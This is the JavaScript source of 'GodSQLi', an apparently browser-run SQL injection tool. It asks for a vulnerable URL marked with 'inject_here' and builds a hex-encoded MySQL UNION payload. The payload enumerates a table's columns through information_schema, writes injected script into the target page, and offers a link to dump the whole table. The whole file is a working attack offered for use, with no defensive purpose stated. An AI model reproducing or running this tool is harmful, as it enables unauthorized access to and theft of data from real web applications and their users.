//GodSQLi script
//Originaly by makman, improvement and re development by March

//Function of GodSQLi

function toHex(str)
{
	var hex ='';
	for(var i=0;i<str.length;i++)
	{
		hex += ''+str.charCodeAt(i).toString(16);
	}
	return hex;
}

function redirect(site)
{
	maksplit=site.split(".");
	dbname=maksplit[0];
	tblname=maksplit[1];
	makrep="concat(IF(@tbl:=0x"+toHex(tblname)+",0x0,0x0),IF(@db:=0x"+toHex(dbname)+",0x0,0x0),concat(0x3c7363726970743e75726c3d22"+toHex(url)+"223b3c2f7363726970743e),concat(concat(0x3c7363726970743e64623d22,@db,0x223b74626c3d22,@tbl,0x223b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e474f4453716c692053796e746178205620312e31204279204d617263683c2f666f6e743e3c62723e3c62723e5461626c65204e616d65203a203c666f6e7420636f6c6f723d626c75653e,@tbl,0x3c2f666f6e743e2066726f6d206461746162617365203a203c666f6e7420636f6c6f723d626c75653e,@db,0x3c2f666f6e743e3c62723e4e756d626572204f6620436f6c756d6e73203a203c666f6e7420636f6c6f723d626c75653e3c7363726970743e636f6c636e743d22,(SELECT count(column_name) from information_schema.columns where table_schema=@db and table_name=@tbl),0x223b646f63756d656e742e777269746528636f6c636e74293b3c2f7363726970743e3c2f666f6e743e,0x3c62723e,(select (@x) from (select (@x:=0x00),(@chk:=1), (select (0) from (information_schema.columns) where (table_schema=0x"+toHex(dbname)+") and (table_name=0x"+toHex(tblname)+") and (0x00) in (@x:=concat_ws(0x20,@x,IF(@chk=1,0x3c7363726970743e20636f6c6e616d65203d206e657720417272617928293b207661722069203d20313b,0x20),0x20636f6c6e616d655b695d203d2022,column_name,0x223b20692b2b3b,IF(@chk:=2,0x20,0x20)))))x),0x666f7228693d313b693c3d636f6c636e743b692b2b297b646f63756d656e742e777269746528223c666f6e7420636f6c6f723d677265656e3e222b692b222e203c2f666f6e743e222b636f6c6e616d655b695d2b223c62723e22293b7d3c2f7363726970743e,concat(0x3c623e,0x3c7363726970743e71756572793d22223b636f6c636e742b2b3b71756572793d22307832322c27222b636f6c6e616d655b315d2b2227223b666f722869746d703d323b69746d703c636f6c636e743b69746d702b2b297b7175657279203d71756572792b222c30783232326332322c27222b636f6c6e616d655b69746d705d2b2227223b7d7175657279323d22307832322c222b636f6c6e616d655b315d3b666f7228693d323b693c636f6c636e743b692b2b297b7175657279323d7175657279322b222c30783232326332322c222b636f6c6e616d655b695d3b7d75726c3d75726c2e7265706c616365282227222c2225323722293b646d7071756572793d75726c2e7265706c6163652822696e6a6563745f68657265222c22636f6e63617428222b71756572792b222c3078323230612c2873656c6563742840292066726f6d2873656c65637428403a3d3078303029202c2873656c656374202840292066726f6d28222b64622b222e222b74626c2b2229776865726528402920696e2028403a3d636f6e6361745f7773283078302c402c222b7175657279322b222c3078323233633632373233652929292961292922293b646f63756d656e742e777269746528273c6120687265663d22272b646d7071756572792b27223e436c69636b204865726520746f2044756d7020746869732077686f6c65205461626c653c613e27293b3c2f7363726970743e))))";
	url=url.replace("'","%27");
	urlpas1=url.replace("inject_here",makrep);
	window.open(urlpas1);
}


//Get user_setting
name=prompt("Please enter your name : ");
url=prompt("Please enter the url you're trying to inject and write 'inject_here' at your injection point.\r\n\r\nExample : http://www.example.site/file.php?id=-4 UNION SELECT 1,2,3,inject_here,5--\r\n\r\nNOTE : Just replace your Injection point with keyword 'inject_here'\r\n\r\n");

//Write html
document.write('<b><font color=red>GODSqli Syntax V 1.1 By March</font><br><br><font color=green size=4>Injected by '+name+'</font><br><table border="1"><tr><td>DB Version : </td><td><font color=blue>'+db_version+'</font></td></tr><tr><td> DB User : </td><td><font color=blue>'+db_user+'</font></td></tr><tr><td>Primary DB : </td><td><font color=blue>'+current_db+'</td></tr></table><br><font color=blue>Choose a table from the dropdown menu : </font><br><select onchange="redirect(this.value)"><option value="mknone" selected>Choose a Table</option>'+options_value+'</select><br /><br /><br /><br />');
